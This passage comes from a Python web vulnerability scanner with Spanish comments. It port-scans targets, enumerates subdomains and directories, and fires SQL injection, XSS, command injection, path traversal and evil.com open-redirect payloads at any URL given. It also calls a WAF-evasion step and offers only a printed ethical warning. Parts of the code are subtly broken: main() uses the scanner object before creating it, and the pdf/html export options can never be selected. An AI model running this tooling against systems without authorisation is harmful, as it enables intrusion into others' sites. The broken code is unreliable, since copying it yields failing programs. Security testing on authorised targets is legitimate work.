            full_url = urljoin(base_url, path)
            response = self._make_request(full_url)
            
            if response and response.status_code == 200:
                size = len(response.content)
                found_items.append({
                    'url': full_url,
                    'status': response.status_code,
                    'size': size,
                    'type': 'directory' if path.endswith('/') else 'file'
                })
                print(f"{Colors.OKGREEN}✅ Encontrado: {full_url} ({size} bytes){Colors.END}")
                
                # Verificar si es un archivo sensible
                sensitive_keywords = ['config', 'backup', 'database', 'admin', 'test']
                if any(keyword in path.lower() for keyword in sensitive_keywords):
                    self._add_vulnerability(
                        "Sensitive File Exposed",
                        "Medium",
                        f"Archivo sensible accesible públicamente: {path}",
                        full_url,
                        "",
                        f"Status: {response.status_code}, Size: {size} bytes",
                        "Remover o proteger archivo sensible",
                        6.5,
                        "CWE-200"
                    )
            
            elif response and response.status_code == 403:
                print(f"{Colors.WARNING}🔒 Forbidden: {full_url}{Colors.END}")
            
            return response
        
        # Verificar directorios comunes
        all_paths = self.common_dirs + self.sensitive_files
        
        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = []
            
            for path in all_paths:
                if self.stop_scanning:
                    break
                
                # Probar tanto con / como sin /
                futures.append(executor.submit(check_path, path))
                futures.append(executor.submit(check_path, path + '/'))
            
            # Procesar resultados
            for future in as_completed(futures):
                if self.stop_scanning:
                    break
                try:
                    future.result()
                except Exception as e:
                    pass  # Errores ya manejados en _make_request
        
        self.directories_found = found_items
        print(f"{Colors.OKGREEN}✅ Enumeración completada: {len(found_items)} elementos encontrados{Colors.END}")
    
    def find_forms(self, base_url: str, max_pages: int = 10):
        """Encuentra formularios HTML para testing posterior"""
        
        print(f"{Colors.OKBLUE}📝 Buscando formularios HTML...{Colors.END}")
        
        forms_found = []
        pages_to_check = [base_url]
        checked_pages = set()
        
        for _ in range(max_pages):
            if not pages_to_check or self.stop_scanning:
                break
            
            current_url = pages_to_check.pop(0)
            if current_url in checked_pages:
                continue
                
            checked_pages.add(current_url)
            
            response = self._make_request(current_url)
            if not response or response.status_code != 200:
                continue
            
            try:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Buscar formularios
                forms = soup.find_all('form')
                for form in forms:
                    form_data = {
                        'url': current_url,
                        'action': form.get('action', ''),
                        'method': form.get('method', 'get').upper(),
                        'inputs': []
                    }
                    
                    # Extraer inputs del formulario
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for input_elem in inputs:
                        input_data = {
                            'name': input_elem.get('name', ''),
                            'type': input_elem.get('type', 'text'),
                            'value': input_elem.get('value', '')
                        }
                        form_data['inputs'].append(input_data)
                    
                    forms_found.append(form_data)
                    print(f"{Colors.OKCYAN}📝 Formulario encontrado: {current_url} -> {form_data['action']}{Colors.END}")
                
                # Buscar enlaces adicionales para crawling básico
                if len(checked_pages) < max_pages:
                    links = soup.find_all('a', href=True)
                    for link in links[:5]:  # Limitar para no ser muy agresivo
                        href = link['href']
                        if href.startswith('/'):
                            full_url = urljoin(base_url, href)
                            if full_url not in checked_pages and full_url not in pages_to_check:
                                pages_to_check.append(full_url)
            
            except Exception as e:
                print(f"{Colors.WARNING}⚠️  Error parseando HTML: {str(e)}{Colors.END}")
        
        self.forms_found = forms_found
        print(f"{Colors.OKGREEN}✅ {len(forms_found)} formularios encontrados{Colors.END}")
        
        return forms_found
    
    def test_sql_injection(self, forms: List[Dict]):
        """Prueba SQL Injection en formularios encontrados"""
        
        print(f"{Colors.OKBLUE}💉 Probando SQL Injection...{Colors.END}")
        
        for form in forms:
            if self.stop_scanning:
                break
            
            if not form['inputs']:
                continue
            
            form_url = urljoin(form['url'], form['action']) if form['action'] else form['url']
            
            for payload in self.sqli_payloads[:10]:  # Limitar payloads para demo
                if self.stop_scanning:
                    break
                
                # Preparar datos del formulario
                form_data = {}
                for input_field in form['inputs']:
                    field_name = input_field['name']
                    if field_name and input_field['type'] not in ['submit', 'button', 'hidden']:
                        form_data[field_name] = payload
                
                if not form_data:
                    continue
                
                # Enviar payload
                response = self._make_request(form_url, form['method'], form_data)
                
                if response:
                    # Detectar posibles errores SQL
                    error_patterns = [
                        r"mysql_fetch_array\(\)",
                        r"ORA-[0-9]{5}",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*mysql_.*",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"Microsoft OLE DB Provider for ODBC Drivers",
                        r"Microsoft JET Database Engine",
                        r"SQLite/JDBCDriver",
                        r"SQL syntax.*MySQL",
                        r"Warning.*\Wmysqli?_",
                        r"MySQLSyntaxErrorException"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self._add_vulnerability(
                                "SQL Injection",
                                "Critical",
                                "Posible vulnerabilidad de SQL Injection detectada por error en base de datos",
                                form_url,
                                payload,
                                f"Error pattern found: {pattern}",
                                "Usar prepared statements y validación de entrada",
                                9.8,
                                "CWE-89"
                            )
                            break
                    
                    # Detectar inyección basada en tiempo (muy básico)
                    if "WAITFOR" in payload.upper():
                        start_time = time.time()
                        response = self._make_request(form_url, form['method'], form_data)
                        end_time = time.time()
                        
                        if end_time - start_time > 4:  # Si tarda más de 4 segundos
                            self._add_vulnerability(
                                "SQL Injection (Time-based)",
                                "Critical",
                                "SQL Injection detectada basada en tiempo de respuesta",
                                form_url,
                                payload,
                                f"Response time: {end_time - start_time:.2f} seconds",
                                "Usar prepared statements y validación de entrada",
                                9.8,
                                "CWE-89"
                            )
    
    def test_xss(self, forms: List[Dict]):
        """Prueba Cross-Site Scripting en formularios"""
        
        print(f"{Colors.OKBLUE}🚨 Probando Cross-Site Scripting...{Colors.END}")
        
        for form in forms:
            if self.stop_scanning:
                break
                
            if not form['inputs']:
                continue
            
            form_url = urljoin(form['url'], form['action']) if form['action'] else form['url']
            
            for payload in self.xss_payloads[:8]:  # Limitar payloads
                if self.stop_scanning:
                    break
                
                # Preparar datos del formulario
                form_data = {}
                for input_field in form['inputs']:
                    field_name = input_field['name']
                    if field_name and input_field['type'] not in ['submit', 'button', 'hidden']:
                        form_data[field_name] = payload
                
                if not form_data:
                    continue
                
                # Enviar payload
                response = self._make_request(form_url, form['method'], form_data)
                
                if response:
                    # Verificar si el payload se refleja sin escapar
                    if payload in response.text:
                        # Verificar que no esté escapado
                        escaped_versions = [
                            payload.replace('<', '&lt;').replace('>', '&gt;'),
                            payload.replace('<', '&amp;lt;').replace('>', '&amp;gt;'),
                            payload.replace('script', '')
                        ]
                        
                        is_escaped = any(escaped in response.text for escaped in escaped_versions)
                        
                        if not is_escaped:
                            self._add_vulnerability(
                                "Cross-Site Scripting (XSS)",
                                "High",
                                "Vulnerabilidad XSS detectada - el input del usuario se refleja sin sanitizar",
                                form_url,
                                payload,
                                f"Payload encontrado en respuesta: {payload[:50]}...",
                                "Implementar validación y escape de datos de entrada",
                                8.6,
                                "CWE-79"
                            )
    
    def test_directory_traversal(self, base_url: str):
        """Prueba Directory Traversal en parámetros GET"""
        
        print(f"{Colors.OKBLUE}📁 Probando Directory Traversal...{Colors.END}")
        
        # Parámetros comunes que podrían ser vulnerables
        common_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'folder']
        
        for param in common_params:
            if self.stop_scanning:
                break
                
            for payload in self.lfi_payloads[:6]:  # Limitar payloads
                if self.stop_scanning:
                    break
                
                test_url = f"{base_url}?{param}={quote(payload)}"
                response = self._make_request(test_url)
                
                if response:
                    # Patrones que indican LFI exitoso
                    lfi_patterns = [
                        r"root:.*:0:0:",  # /etc/passwd
                        r"\[boot loader\]",  # boot.ini
                        r"<\?php",  # archivos PHP
                        r"# Copyright.*Microsoft Corp",  # hosts de Windows
                        r"# This file contains the mappings"  # hosts de Linux
                    ]
                    
                    for pattern in lfi_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self._add_vulnerability(
                                "Directory Traversal / Local File Inclusion",
                                "High",
                                "Posible vulnerabilidad de Directory Traversal detectada",
                                test_url,
                                payload,
                                f"Pattern matched: {pattern}",
                                "Validar y sanitizar rutas de archivos",
                                8.2,
                                "CWE-22"
                            )
                            break
    
    def test_command_injection(self, forms: List[Dict]):
        """Prueba Command Injection básico"""
        
        print(f"{Colors.OKBLUE}💻 Probando Command Injection...{Colors.END}")
        
        for form in forms:
            if self.stop_scanning:
                break
                
            if not form['inputs']:
                continue
            
            form_url = urljoin(form['url'], form['action']) if form['action'] else form['url']
            
            for payload in self.cmd_payloads[:5]:  # Limitar payloads
                if self.stop_scanning:
                    break
                
                # Solo probar en campos que podrían ejecutar comandos
                suspicious_fields = ['cmd', 'command', 'exec', 'system', 'ping', 'host']
                
                form_data = {}
                has_suspicious_field = False
                
                for input_field in form['inputs']:
                    field_name = input_field['name']
                    if field_name and input_field['type'] not in ['submit', 'button', 'hidden']:
                        if any(susp in field_name.lower() for susp in suspicious_fields):
                            form_data[field_name] = payload
                            has_suspicious_field = True
                        else:
                            form_data[field_name] = "test"
                
                if not has_suspicious_field or not form_data:
                    continue
                
                # Enviar payload
                response = self._make_request(form_url, form['method'], form_data)
                
                if response:
                    # Patrones que indican ejecución exitosa
                    cmd_patterns = [
                        r"uid=\d+.*gid=\d+",  # output de 'id'
                        r"Linux.*GNU",  # output de 'uname'
                        r"Microsoft Windows",  # output de 'ver'
                        r"Volume.*Serial Number",  # output de Windows
                        r"PING.*bytes of data"  # output de ping
                    ]
                    
                    for pattern in cmd_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self._add_vulnerability(
                                "Command Injection",
                                "Critical",
                                "Vulnerabilidad de Command Injection detectada",
                                form_url,
                                payload,
                                f"Command output pattern: {pattern}",
                                "Evitar ejecución directa de comandos del sistema",
                                9.9,
                                "CWE-78"
                            )
                            break
    
    def test_open_redirects(self, base_url: str):
        """Prueba Open Redirect vulnerabilities"""
        
        print(f"{Colors.OKBLUE}🔄 Probando Open Redirects...{Colors.END}")
        
        # Parámetros comunes para redirects
        redirect_params = ['redirect', 'url', 'next', 'return', 'goto', 'continue', 'r', 'u']
        
        # Payloads para testing
        redirect_payloads = [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>"
        ]
        
        for param in redirect_params:
            if self.stop_scanning:
                break
                
            for payload in redirect_payloads:
                if self.stop_scanning:
                    break
                
                test_url = f"{base_url}?{param}={quote(payload)}"
                response = self._make_request(test_url, allow_redirects=False)
                
                if response:
                    # Verificar redirect en headers
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            self._add_vulnerability(
                                "Open Redirect",
                                "Medium",
                                "Vulnerabilidad de Open Redirect detectada",
                                test_url,
                                payload,
                                f"Redirects to: {location}",
                                "Validar URLs de redirección contra whitelist",
                                6.1,
                                "CWE-601"
                            )
    
    def check_security_headers(self, response: requests.Response):
        """Verifica headers de seguridad importantes"""
        
        print(f"{Colors.OKBLUE}🛡️  Verificando headers de seguridad...{Colors.END}")
        
        security_headers = {
            'X-Frame-Options': {
                'missing': "Missing X-Frame-Options header - vulnerable to clickjacking",
                'severity': 'Medium',
                'remediation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
            },
            'X-XSS-Protection': {
                'missing': "Missing X-XSS-Protection header",
                'severity': 'Low',
                'remediation': 'Add X-XSS-Protection: 1; mode=block'
            },
            'X-Content-Type-Options': {
                'missing': "Missing X-Content-Type-Options header",
                'severity': 'Low',
                'remediation': 'Add X-Content-Type-Options: nosniff'
            },
            'Strict-Transport-Security': {
                'missing': "Missing HSTS header - vulnerable to MITM attacks",
                'severity': 'Medium',
                'remediation': 'Add Strict-Transport-Security: max-age=31536000; includeSubDomains'
            },
            'Content-Security-Policy': {
                'missing': "Missing Content Security Policy header",
                'severity': 'Medium',
                'remediation': 'Implement proper CSP header'
            },
            'Referrer-Policy': {
                'missing': "Missing Referrer-Policy header",
                'severity': 'Info',
                'remediation': 'Add Referrer-Policy: strict-origin-when-cross-origin'
            }
        }
        
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        for header, info in security_headers.items():
            if header.lower() not in headers_lower:
                self._add_vulnerability(
                    f"Missing Security Header: {header}",
                    info['severity'],
                    info['missing'],
                    self.target_url,
                    "",
                    f"Header '{header}' not present",
                    info['remediation'],
                    4.3 if info['severity'] == 'Medium' else 2.1,
                    "CWE-693"
                )
    
    def generate_report(self) -> ScanResult:
        """Genera reporte completo del escaneo"""
        
        scan_result = ScanResult(
            target_url=self.target_url,
            scan_start=datetime.fromtimestamp(self.start_time).strftime("%Y-%m-%d %H:%M:%S"),
            scan_end=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            vulnerabilities=self.vulnerabilities,
            technologies=self.technologies,
            ssl_info={},  # Se llenaría con check_ssl_configuration
            server_info={},
            directories_found=self.directories_found,
            total_requests=self.total_requests,
            scan_duration=time.time() - self.start_time if self.start_time else 0
        )
        
        return scan_result
    
    def print_summary_report(self):
        """Imprime resumen ejecutivo del escaneo"""
        
        print(f"\n{Colors.HEADER}{Colors.BOLD}")
        print("=" * 80)
        print("🕷️  REPORTE DE VULNERABILIDADES WEB")
        print("=" * 80)
        print(f"{Colors.END}")
        
        # Resumen general
        print(f"{Colors.OKBLUE}🎯 Target: {Colors.BOLD}{self.target_url}{Colors.END}")
        print(f"{Colors.OKBLUE}🕐 Duración: {time.time() - self.start_time:.2f} segundos{Colors.END}")
        print(f"{Colors.OKBLUE}📡 Requests realizados: {self.total_requests}{Colors.END}")
        
        # Resumen de vulnerabilidades por severidad
        severity_counts = {}
        for vuln in self.vulnerabilities:
            severity_counts[vuln.severity] = severity_counts.get(vuln.severity, 0) + 1
        
        print(f"\n{Colors.BOLD}📊 RESUMEN DE VULNERABILIDADES:{Colors.END}")
        severity_colors = {
            'Critical': Colors.CRITICAL,
            'High': Colors.FAIL,
            'Medium': Colors.WARNING,
            'Low': Colors.OKCYAN,
            'Info': Colors.OKBLUE
        }
        
        for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            count = severity_counts.get(severity, 0)
            color = severity_colors[severity]
            print(f"{color}  {severity}: {count}{Colors.END}")
        
        # Tecnologías detectadas
        if self.technologies:
            print(f"\n{Colors.BOLD}🛠️  TECNOLOGÍAS DETECTADAS:{Colors.END}")
            for tech in self.technologies[:10]:  # Mostrar solo las primeras 10
                print(f"  • {tech.name} {tech.version} (Confidence: {tech.confidence}%)")
        
        # Vulnerabilidades detalladas
        if self.vulnerabilities:
            print(f"\n{Colors.BOLD}🚨 VULNERABILIDADES ENCONTRADAS:{Colors.END}")
            print("-" * 80)
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                severity_color = severity_colors.get(vuln.severity, Colors.END)
                print(f"{severity_color}[{i}] {vuln.name} - {vuln.severity}{Colors.END}")
                print(f"    📍 Location: {vuln.location}")
                print(f"    📝 Description: {vuln.description}")
                if vuln.payload:
                    print(f"    🎯 Payload: {vuln.payload}")
                if vuln.evidence:
                    print(f"    🔍 Evidence: {vuln.evidence[:100]}...")
                print(f"    💊 Remediation: {vuln.remediation}")
                if vuln.cvss_score > 0:
                    print(f"    📊 CVSS Score: {vuln.cvss_score}")
                print()
        
        # Estadísticas finales
        print(f"{Colors.BOLD}📈 ESTADÍSTICAS:{Colors.END}")
        print(f"  • Directorios encontrados: {len(self.directories_found)}")
        print(f"  • Formularios encontrados: {len(self.forms_found)}")
        print(f"  • Total vulnerabilidades: {len(self.vulnerabilities)}")
        
        risk_score = sum([
            10 * severity_counts.get('Critical', 0),
            7 * severity_counts.get('High', 0),
            4 * severity_counts.get('Medium', 0),
            2 * severity_counts.get('Low', 0),
            1 * severity_counts.get('Info', 0)
        ])
        
        if risk_score >= 30:
            risk_level = f"{Colors.CRITICAL}CRÍTICO{Colors.END}"
        elif risk_score >= 15:
            risk_level = f"{Colors.FAIL}ALTO{Colors.END}"
        elif risk_score >= 8:
            risk_level = f"{Colors.WARNING}MEDIO{Colors.END}"
        else:
            risk_level = f"{Colors.OKGREEN}BAJO{Colors.END}"
        
        print(f"  • Nivel de riesgo: {risk_level} (Score: {risk_score})")
        
        print(f"\n{Colors.HEADER}{'=' * 80}{Colors.END}")
    
    def export_report(self, filename: str = None, format_type: str = "json"):
        """Exporta el reporte a archivo"""
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            domain = urlparse(self.target_url).netloc.replace(':', '_')
            filename = f"vuln_scan_{domain}_{timestamp}.{format_type}"
        
        scan_result = self.generate_report()
        
        try:
            if format_type.lower() == "json":
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(asdict(scan_result), f, indent=2, default=str, ensure_ascii=False)
            
            elif format_type.lower() == "txt":
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("WEB VULNERABILITY SCAN REPORT\n")
                    f.write("=" * 50 + "\n\n")
                    f.write(f"Target: {self.target_url}\n")
                    f.write(f"Scan Date: {scan_result.scan_start}\n")
                    f.write(f"Duration: {scan_result.scan_duration:.2f} seconds\n")
                    f.write(f"Total Requests: {scan_result.total_requests}\n\n")
                    
                    f.write("VULNERABILITIES FOUND:\n")
                    f.write("-" * 30 + "\n")
                    for vuln in self.vulnerabilities:
                        f.write(f"[{vuln.severity}] {vuln.name}\n")
                        f.write(f"Location: {vuln.location}\n")
                        f.write(f"Description: {vuln.description}\n")
                        f.write(f"Remediation: {vuln.remediation}\n\n")
            
            print(f"{Colors.OKGREEN}✅ Reporte exportado: {filename}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.FAIL}❌ Error exportando reporte: {str(e)}{Colors.END}")
    
    def scan(self, target_url: str) -> ScanResult:
        """Función principal de escaneo mejorada: incluye IP y escaneo de puertos"""
        import socket
        self.start_time = time.time()
        self.target_url = target_url.rstrip('/')
        # Validar URL
        parsed = urlparse(self.target_url)
        if not parsed.scheme or not parsed.netloc:
            print(f"{Colors.FAIL}❌ URL inválida: {target_url}{Colors.END}")
            return None
        self.base_domain = parsed.netloc
        print(f"{Colors.HEADER}{Colors.BOLD}")
        print("🕷️" + "=" * 78)
        print("   ULTRA PROFESSIONAL WEB VULNERABILITY SCANNER v3.0")
        print("=" * 79)
        print(f"{Colors.END}")
        print(f"{Colors.WARNING}⚠️  ADVERTENCIA ÉTICA:{Colors.END}")
        print(f"   Solo escanear sitios web de tu propiedad o con autorización")
        print(f"   Este escáner es únicamente para fines educativos y de seguridad\n")
        print(f"{Colors.OKBLUE}🎯 Target: {Colors.BOLD}{self.target_url}{Colors.END}")
        print(f"{Colors.OKBLUE}🕐 Iniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
        print(f"{Colors.OKBLUE}⚙️  Configuración: {self.config['threads']} threads, {self.config['timeout']}s timeout{Colors.END}")
        print()

        # === NUEVO: Resolución de IP y escaneo de puertos ===
        ip_addr = None
        open_ports = []
        try:
            ip_addr = socket.gethostbyname(self.base_domain)
            print(f"{Colors.OKCYAN}🌐 IP objetivo: {ip_addr}{Colors.END}")
            # Escaneo rápido de puertos comunes
            common_ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443,8888]
            common_ports += list(range(1,1025))  # Puertos 1-1024
            common_ports = sorted(set(common_ports))
            print(f"{Colors.OKCYAN}🔎 Escaneando puertos...{Colors.END}")
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    result = sock.connect_ex((ip_addr, port))
                    if result == 0:
                        open_ports.append(port)
                        print(f"{Colors.OKGREEN}✅ Puerto abierto: {port}{Colors.END}")
                    sock.close()
                except Exception:
                    continue
            if not open_ports:
                print(f"{Colors.WARNING}⚠️  No se detectaron puertos abiertos comunes.{Colors.END}")
        except Exception as e:
            print(f"{Colors.WARNING}⚠️  No se pudo resolver la IP o escanear puertos: {e}{Colors.END}")
        # Guardar info en el reporte
        self.server_info = {'ip': ip_addr, 'open_ports': open_ports}

        try:
            # Fase 1: Request inicial y fingerprinting
            print(f"{Colors.HEADER}📋 FASE 1: RECONOCIMIENTO INICIAL{Colors.END}")
            initial_response = self._make_request(self.target_url)
            if not initial_response:
                print(f"{Colors.FAIL}❌ No se pudo conectar al target{Colors.END}")
                return None
            print(f"{Colors.OKGREEN}✅ Conectado exitosamente (Status: {initial_response.status_code}){Colors.END}")
            # Detectar tecnologías
            self.fingerprint_technologies(initial_response)
            # Verificar headers de seguridad
            self.check_security_headers(initial_response)
            # Análisis avanzado de headers y cookies
            self.analyze_advanced_headers(initial_response)

            # Análisis SSL si es HTTPS
            if self.target_url.startswith('https://'):
                self.check_ssl_configuration(self.base_domain)

            # === NUEVO: Escaneo de subdominios ===
            print(f"\n{Colors.HEADER}📋 FASE 2: ENUMERACIÓN DE SUBDOMINIOS{Colors.END}")
            subdomain_results = self.enumerate_subdomains(self.base_domain)
            self.subdomains_found = [h.get('host','') if isinstance(h,dict) else h for _,_,h in subdomain_results if h]
            print(f"{Colors.OKGREEN}✅ Subdominios encontrados: {len(self.subdomains_found)}{Colors.END}")

            # === Fuzzing de rutas/archivos sensibles en subdominios ===
            print(f"\n{Colors.HEADER}📋 FASE 3: FUZZING DE RUTAS/ARCHIVOS EN SUBDOMINIOS{Colors.END}")
            for sub in self.subdomains_found:
                if not sub: continue
                url = f"http://{sub}" if not sub.startswith('http') else sub
                try:
                    self.directory_enumeration(url)
                except Exception as e:
                    print(f"{Colors.WARNING}⚠️  Error enumerando en subdominio {sub}: {e}{Colors.END}")

            # Fase 4: Enumeración en dominio principal
            print(f"\n{Colors.HEADER}📋 FASE 4: ENUMERACIÓN EN DOMINIO PRINCIPAL{Colors.END}")
            self.directory_enumeration(self.target_url)

            # Fase 5: Búsqueda de formularios
            print(f"\n{Colors.HEADER}📋 FASE 5: ANÁLISIS DE FORMULARIOS{Colors.END}")
            forms = self.find_forms(self.target_url)

            # Fase 6: Testing de vulnerabilidades
            print(f"\n{Colors.HEADER}📋 FASE 6: TESTING DE VULNERABILIDADES{Colors.END}")
            if forms:
                self.test_sql_injection(forms)
                self.test_xss(forms)
                self.test_command_injection(forms)
            self.test_directory_traversal(self.target_url)
            self.test_open_redirects(self.target_url)

            # Optimización de concurrencia y evasión de WAFs
            self.optimize_concurrency_and_waf()
            # Generar reporte
            print(f"\n{Colors.HEADER}📋 GENERANDO REPORTE FINAL{Colors.END}")
            self.print_summary_report()
            return self.generate_report()
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}⚠️  Escaneo interrumpido por el usuario{Colors.END}")
            self.stop_scanning = True
            return self.generate_report()
        except Exception as e:
            print(f"{Colors.FAIL}❌ Error durante el escaneo: {str(e)}{Colors.END}")
            return None

def main():
    # ...existing code...
    """Función principal con interfaz CLI avanzada"""
    

    parser = argparse.ArgumentParser(
        description='🕷️ Ultra Professional Web Vulnerability Scanner v3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
                epilog='''
Ejemplos de uso:
    %(prog)s https://example.com
    %(prog)s http://testphp.vulnweb.com --threads 50
    %(prog)s https://demo.testfire.net --output json
    %(prog)s http://dvwa.local --fast --export report.json

Opciones avanzadas de recursos:
    --max-ram 4096        Limita el uso máximo de RAM (MB) (default: 2048, máximo: 5120)
    --max-cpu 50          Limita el uso máximo de CPU (%%) (default: 50, máximo: 75)
    --scan-mode [normal|aggressive|paranoid]  Controla la agresividad del escaneo
                '''
    )

    # Argumentos principales
    parser.add_argument('url', help='URL objetivo para escanear')
    parser.add_argument('-t', '--threads', type=int, default=20,
                       help='Número de hilos concurrentes (default: 20)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Timeout para requests en segundos (default: 10)')
    parser.add_argument('--delay', type=float, default=0.1,
                       help='Delay entre requests en segundos (default: 0.1)')

    # Opciones de recursos
    parser.add_argument('--max-ram', type=int, default=2048,
                       help='Limita el uso máximo de RAM en MB (default: 2048, máximo: 5120)')
    parser.add_argument('--max-cpu', type=int, default=50,
                       help='Limita el uso máximo de CPU en porcentaje (default: 50, máximo: 75)')
    parser.add_argument('--scan-mode', choices=['normal', 'aggressive', 'paranoid'], default='normal',
                       help='Modo de escaneo: normal, aggressive (rápido y exhaustivo), paranoid (muy lento y sigiloso)')

    # Opciones de escaneo
    parser.add_argument('--fast', action='store_true',
                       help='Modo rápido - menos tests, más velocidad')
    parser.add_argument('--deep', action='store_true',
                       help='Modo profundo - más tests y payloads')
    parser.add_argument('--no-ssl-verify', action='store_true',
                       help='No verificar certificados SSL')

    # Opciones de salida
    parser.add_argument('-o', '--output', choices=['json', 'txt'], default='json',
                       help='Formato del reporte (default: json)')
    parser.add_argument('--export', help='Archivo para exportar reporte')
    parser.add_argument('--quiet', action='store_true',
                       help='Modo silencioso - solo mostrar vulnerabilidades')

    args = parser.parse_args()
    # Exportación avanzada de reportes (html/pdf)
    if args.export:
        if args.output == 'pdf':
            scanner.export_report_pdf_advanced(args.export)
        elif args.output == 'html':
            scanner.export_report_html(args.export)
        else:
            scanner.export_report(args.export, args.output)

    # Validar límites máximos
    if args.max_ram > 5120:
        print(f"{Colors.WARNING}⚠️  El máximo permitido de RAM es 5120 MB (5GB). Usando 5120 MB.{Colors.END}")
        args.max_ram = 5120
    if args.max_cpu > 75:
        print(f"{Colors.WARNING}⚠️  El máximo permitido de CPU es 75%. Usando 75%.{Colors.END}")
        args.max_cpu = 75
    
    # Validar URL básica
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    # Configuración del escáner
    config = {
        'threads': args.threads,
        'timeout': args.timeout,
        'delay': args.delay,
        'verify_ssl': not args.no_ssl_verify
    }
    
    # Ajustes para modos especiales
    if args.fast:
        config['threads'] = min(config['threads'] * 2, 100)
        config['delay'] = 0.05
        print(f"{Colors.OKCYAN}🚀 Modo RÁPIDO activado{Colors.END}")
    
    if args.deep:
        config['delay'] = 0.2
        print(f"{Colors.OKCYAN}🔍 Modo PROFUNDO activado{Colors.END}")
    
    # Crear y ejecutar escáner
    scanner = WebVulnScanner(config)
    
    try:
        result = scanner.scan(args.url)
        
        if result and args.export:
            scanner.export_report(args.export, args.output)
        
        return 0
        
    except Exception as e:
        print(f"{Colors.FAIL}❌ Error fatal: {str(e)}{Colors.END}")
        return 1

if __name__ == "__main__":
    # Banner inicial
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║                     VULNERABILITY SCANNER                          ║")  
    print("║                   Professional Pentesting Tool                    ║")
    print("║                           OF DARKSKULL                             ║")
    print("║  ⚠️                                                           ⚠️   ║")
    print("╚════════════════════════════════════════════════════════════════════╝")
    print(f"{Colors.END}")
    
    exit_code = main()
    sys.exit(exit_code)